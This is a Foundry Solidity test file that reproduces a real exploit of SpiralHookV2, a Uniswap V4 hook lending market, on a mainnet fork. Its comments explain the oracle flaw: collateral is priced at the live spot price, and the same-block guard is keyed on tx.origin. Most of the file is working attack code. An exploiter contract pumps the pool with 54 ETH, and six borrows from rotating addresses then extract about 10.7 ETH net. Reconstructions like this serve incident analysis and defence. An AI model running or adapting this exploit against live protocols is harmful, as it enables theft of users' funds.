// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// SpiralHookV2 - Uniswap V4 hook lending market. Same-block spot-price oracle manipulation, with the
// noSameBlockSwap re-use guard bypassed by rotating tx.origin across 6 EOAs - Ethereum. Net ~10.7 ETH.
//
// Block          : 25974146 (all 7 attack txs are in this one block)
// Attacker EOA   : 0x859E69A29244A10800A34eE66919426C02afa2F0 (does the pump)
// Attack contract: 0x0C23C8BC3b7C565f3f9F4aC691A4Dc4275086F86
// SpiralHookV2   : 0x1725577dC9B1ee2D95dB49c2193226471594aacc (verified; the V4 hook AND the lending book)
// SPIRAL token   : 0x6a77E39240dA69Ea788e4cF93663D2c41EA4b12b (currency1)
// V4 PoolManager : 0x000000000004444c5dc75cB358380D2e3dE08A90
// PoolKey        : { currency0: ETH(0), currency1: SPIRAL, fee: 0, tickSpacing: 60, hooks: SpiralHookV2 }
//
// The 7 candidate txs, all in block 25974146:
//   tx0 0x84f2f1d0... from 0x859E..2f0            value 54 ETH  selector 0x5705b581  -> the PUMP (buy swap)
//   tx1 0x0599c776... from 0x863d23E2..edb         value 0       selector 0x1242e326  -> borrow #0
//   tx2 0x3172b1d4... from 0x8DAF9567..f97         value 0       selector 0x1242e326  -> borrow #1
//   tx3 0x09524ce1... from 0xf914ECa7..375         value 0       selector 0x1242e326  -> borrow #2
//   tx4 0x129f6c68... from 0x02399536..0E          value 0       selector 0x1242e326  -> borrow #3
//   tx5 0xc1975777... from 0x4116d22F..629         value 0       selector 0x1242e326  -> borrow #4
//   tx6 0x0dd9a193... from 0xF3E7add5..DD          value 0       selector 0x1242e326  -> borrow #5
// So exactly ONE tx does the price pump; the other SIX are the multi-EOA borrows. 6 distinct tx.origins.
//
// ROOT CAUSE (verified against the verified source + the full on-chain trace of every tx):
//   1. borrow(collateralSpiral, minEthOut) values the deposited SPIRAL at the LIVE Uniswap V4 spot price,
//      read straight from poolManager.getSlot0(_poolId()) with NO TWAP and NO deviation/price-change cap:
//          (uint160 sqrtP,,,) = poolManager.getSlot0(_poolId());
//          uint256 collateralValue = LDF.spiralValueInETH(sqrtP, collateralSpiral);
//          uint256 plannedDebt     = (collateralValue * LTV_BPS) / 10_000;
//      So a single large same-block buy that inflates the pool spot lets the deposited SPIRAL be valued at
//      the pumped price, and the protocol lends out ETH against that inflated valuation.
//   2. The intended defence is the noSameBlockSwap modifier (SpiralStateV2.sol), but it keys on tx.origin:
//          modifier noSameBlockSwap() {
//              if (uint64(block.number) <= lastSwapBlockOf[tx.origin]) revert SwapInSameBlock();
//              _;
//              lastSwapBlockOf[tx.origin] = uint64(block.number);
//          }
//      and afterSwap() likewise writes lastSwapBlockOf[tx.origin] = block.number. So the pump only "burns"
//      the ORIGIN THAT SWAPPED. Any other EOA still reads lastSwapBlockOf == 0 and passes the check, even
//      though the pool is already pumped in this same block. The attacker routes all 6 borrows through the
//      SAME attack contract (msg.sender is constant) but from 6 DIFFERENT EOAs, so each borrow carries a
//      fresh tx.origin and individually clears the guard.
//   3. borrow() is fully permissionless (external, only gated by tradingOpen/poolInitialized + the broken
//      guard) and the V4 pool swap is permissionless. Nothing else stands in the way.
//
// ECONOMICS (from the on-chain traces, reproduced below):
//   pump: 54 ETH in -> 141,059.24 SPIRAL out, spot pushed to ~0.0012041 ETH/SPIRAL (entrySpot on every borrow).
//   6 borrows deposit the whole 141,059.24 SPIRAL back as collateral and pull out ETH:
//        #0 26,194.70 SPIRAL -> 12.30151 ETH
//        #1 47,692.13 SPIRAL -> 22.39710 ETH
//        #2 26,519.14 SPIRAL -> 10.93431 ETH
//        #3 25,799.74 SPIRAL -> 12.11603 ETH
//        #4  7,786.47 SPIRAL ->  3.65667 ETH
//        #5  7,067.07 SPIRAL ->  3.30165 ETH
//   total out 64.7072 ETH - 54 ETH pumped in = 10.7072 ETH net profit (the reported ~10.7 ETH loss).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

// Uniswap V4 core (minimal). Currency is an address (native ETH == address(0)); BalanceDelta is a packed int256.
struct PoolKey {
    address currency0;
    address currency1;
    uint24 fee;
    int24 tickSpacing;
    address hooks;
}

struct SwapParams {
    bool zeroForOne;
    int256 amountSpecified;
    uint160 sqrtPriceLimitX96;
}

interface IPoolManager {
    function unlock(bytes calldata data) external returns (bytes memory);
    function swap(PoolKey calldata key, SwapParams calldata params, bytes calldata hookData)
        external
        returns (int256 delta);
    function sync(address currency) external;
    function settle() external payable returns (uint256);
    function take(address currency, address to, uint256 amount) external;
}

interface ISpiralHookV2 {
    function borrow(uint256 collateralSpiral, uint256 minEthOut)
        external
        returns (uint256 positionId, uint256 ethOut);
    function lastSwapBlockOf(address origin) external view returns (uint64);
}

/// @notice Reconstruction of the on-chain attack contract 0x0C23C8BC...F86.
///         - pump(): opens a V4 unlock and buys SPIRAL with ETH, inflating the pool spot.
///         - executeBorrow(): approves and calls SpiralHookV2.borrow. msg.sender to borrow is ALWAYS this
///           contract; the test drives each call from a different EOA so tx.origin rotates.
contract SpiralExploiter {
    IPoolManager public immutable pm;
    IERC20 public immutable spiral;
    ISpiralHookV2 public immutable hook;
    PoolKey public key;

    // near MIN_SQRT_PRICE - the exact sqrtPriceLimit the attacker used on the pump swap.
    uint160 constant SWAP_LIMIT = 4295128740;

    constructor(IPoolManager _pm, IERC20 _spiral, ISpiralHookV2 _hook) {
        pm = _pm;
        spiral = _spiral;
        hook = _hook;
        key = PoolKey({
            currency0: address(0),
            currency1: address(_spiral),
            fee: 0,
            tickSpacing: 60,
            hooks: address(_hook)
        });
    }

    receive() external payable {}

    /// @dev Buy SPIRAL with all forwarded ETH, pumping the pool spot for this block.
    function pump() external payable {
        pm.unlock(abi.encode(msg.value));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(pm), "only pm");
        uint256 ethIn = abi.decode(data, (uint256));

        // exact-input ETH -> SPIRAL (zeroForOne). Hook skims its ETH fee inside before/afterSwap.
        int256 delta = pm.swap(key, SwapParams(true, -int256(ethIn), SWAP_LIMIT), "");

        // currency1 (SPIRAL) delta is owed TO us; low 128 bits, positive.
        int128 spiralOwed = int128(delta);

        // pay exactly the ETH we owe (swap amount + the hook's skimmed fee == ethIn), then take the SPIRAL.
        // Note: settle the exact debt, not the full balance - the CREATE2 test address can already hold
        // mainnet dust on the fork, and over-settling leaves a positive delta => CurrencyNotSettled().
        pm.sync(address(0));
        pm.settle{value: ethIn}();
        pm.take(address(spiral), address(this), uint256(uint128(spiralOwed)));
        return "";
    }

    /// @dev One borrow against the (already pumped) spot. Constant msg.sender, rotating tx.origin.
    function executeBorrow(uint256 collateralSpiral) external returns (uint256 positionId, uint256 ethOut) {
        spiral.approve(address(hook), collateralSpiral);
        (positionId, ethOut) = hook.borrow(collateralSpiral, 0);
    }
}

contract SpiralHookV2_exp is Test {
    IPoolManager constant PM = IPoolManager(0x000000000004444c5dc75cB358380D2e3dE08A90);
    IERC20 constant SPIRAL = IERC20(0x6a77E39240dA69Ea788e4cF93663D2c41EA4b12b);
    ISpiralHookV2 constant HOOK = ISpiralHookV2(0x1725577dC9B1ee2D95dB49c2193226471594aacc);

    uint256 constant PUMP_ETH = 54 ether;

    // The exact on-chain collateral amounts for the 6 borrows (sum == the pump's SPIRAL output).
    uint256[6] COLLATERAL = [
        uint256(26194701114956762271800),
        uint256(47692129493628870889046),
        uint256(26519137370015462073767),
        uint256(25799735239233127730276),
        uint256(7786470121408795247191),
        uint256(7067067990626460903703)
    ];

    SpiralExploiter exploiter;
    address pumperEOA = makeAddr("pumperEOA");

    function setUp() public {
        // Fork at the PARENT of the attack block. The pump + borrows are all reconstructed live.
        vm.createSelectFork("mainnet", 25974145);
        exploiter = new SpiralExploiter(PM, SPIRAL, HOOK);
    }

    function testExploit() public {
        assertTrue(exploiter.hook().lastSwapBlockOf(pumperEOA) == 0, "clean pre-state");

        // ── Step 1: PUMP. Attacker EOA sends 54 ETH; the contract buys SPIRAL and inflates the spot. ──
        vm.deal(pumperEOA, PUMP_ETH);
        vm.prank(pumperEOA, pumperEOA); // msg.sender AND tx.origin = pumper
        exploiter.pump{value: PUMP_ETH}();

        uint256 spiralBought = SPIRAL.balanceOf(address(exploiter));
        emit log_named_decimal_uint("SPIRAL bought by 54 ETH pump", spiralBought, 18);
        assertGt(spiralBought, 140000e18, "pump should yield ~141k SPIRAL");

        // The pumper's origin is now burned for this block: its own borrow would revert.
        assertEq(exploiter.hook().lastSwapBlockOf(pumperEOA), uint64(block.number), "pumper origin burned");

        // ── Proof the guard is real and per-origin: a borrow from the pumper's own origin reverts. ──
        vm.prank(pumperEOA, pumperEOA);
        vm.expectRevert(); // SwapInSameBlock()
        exploiter.executeBorrow(COLLATERAL[0]);

        // ── Step 2: 6 borrows, each from a DIFFERENT EOA (different tx.origin), same block, same pump. ──
        uint256 startBal = address(exploiter).balance; // 0 after the pump settled
        uint256 totalEthOut;

        for (uint256 i = 0; i < 6; i++) {
            address eoa = makeAddr(string.concat("borrowEOA", vm.toString(i)));
            // this EOA has never swapped -> lastSwapBlockOf == 0 -> passes the tx.origin-keyed guard.
            assertEq(HOOK.lastSwapBlockOf(eoa), 0, "fresh origin");

            vm.prank(eoa, eoa); // msg.sender to executeBorrow = eoa; nested borrow keeps tx.origin = eoa
            (uint256 posId, uint256 ethOut) = exploiter.executeBorrow(COLLATERAL[i]);
            totalEthOut += ethOut;
            emit log_named_decimal_uint(
                string.concat("borrow #", vm.toString(i), " ethOut (origin ", vm.toString(eoa), ")"), ethOut, 18
            );

            // each borrow individually passed and, only AT ITS END, stamped its own origin.
            assertEq(HOOK.lastSwapBlockOf(eoa), uint64(block.number), "origin stamped after");
            posId; // silence unused
        }

        // ── Result ──
        uint256 gained = address(exploiter).balance - startBal;
        emit log_named_decimal_uint("total ETH pulled from 6 borrows", totalEthOut, 18);
        int256 netProfit = int256(gained) - int256(PUMP_ETH);
        emit log_named_decimal_int("NET PROFIT (after repaying the 54 ETH pump)", netProfit, 18);

        assertEq(gained, totalEthOut, "all borrow ETH landed in the attack contract");
        assertGt(totalEthOut, PUMP_ETH, "extraction exceeds pump cost");
        // reported loss ~10.7 ETH.
        assertApproxEqAbs(uint256(netProfit), 10.7 ether, 0.3 ether, "net ~10.7 ETH");
    }
}
